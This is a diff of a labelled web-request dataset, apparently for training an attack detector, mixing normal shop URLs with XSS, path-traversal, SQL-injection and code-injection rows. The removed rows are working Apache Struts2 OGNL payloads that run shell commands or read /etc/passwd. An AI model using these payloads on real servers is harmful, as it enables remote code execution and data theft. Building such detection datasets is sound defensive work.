@@ -9076,7 +9052,6 @@ global/menum.jsp,normal
 publico/caracteristicas.jsp?id=1,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 <script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,xss
-"%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(""/""))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 publico/autenticar.jsp?modo=entrar&login=derrick&pwd=MaNUmitI6&remember=on&B1=Entrar,normal
 publico/productos.jsp,normal
 """<IMG LOWSRC=""""javascript:alert('XSS')"""">""",xss
@@ -9639,7 +9614,6 @@ publico/pagar.jsp?modo=insertar&precio=7781&B1=Confirmar,normal
 imagenes/cmenbul.gif,normal
 <video src=1 onerror=alert(1)>,xss
 <svg/onload=alert(1),xss
-"%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8",code_injection
 imagenes/3.gif,normal
 <frameset onload=javascript:javascript:alert(1)></frameset>,xss
 miembros/imagenes/castro.jpg,normal
@@ -9946,7 +9920,6 @@ publico/caracteristicas.jsp?id=2,normal
 <body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
 "<img src=""javascript:alert('XSS');"">",xss
 %252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
-"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ijyjaxr','ijyjaxr')}.multipart/form-data",code_injection
 index.jsp,normal
 <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
 publico/productos.jsp,normal
@@ -9967,7 +9940,6 @@ publico/caracteristicas.jsp?id=2,normal
 miembros/index.jsp,normal
 miembros/imagenes/castro.jpg,normal
 '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,xss
-"class.classLoader.jarPath=(#context[""xwork.MethodAccessor.denyMethodExecution""]= new java.lang.Boolean(false), #_memberAccess[""allowStaticMethodAccess""]=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(#req.getRealPath(""/"")),#outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]",code_injection
 "<img SRC=""jav ascript:document.vulnerable=true;"">",xss
 publico/autenticar.jsp?modo=entrar&login=terangue&pwd=potrear&remember=on&B1=Entrar,normal
 "<img \x11src=x onerror=""javascript:alert(1)"">",xss
@@ -9977,7 +9949,6 @@ global/estilos.css,normal
 %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
 publico/pagar.jsp?modo=insertar&precio=9805&B1=Confirmar,normal
 imagenes/2.gif,normal
-"${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd",code_injection
 ' or userid like '%,sqli
 "<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
 "<div style=""x:expression((window.r==1)?'':eval('r=1;",xss
@@ -10183,7 +10154,6 @@ miembros/imagenes/ogono.jpg,normal
 miembros/imagenes/castro.jpg,normal
 "</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
 }</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,xss
-"%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 miembros/imagenes/ogono.jpg,normal
 "`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
 imagenes/cmenbul.gif,normal
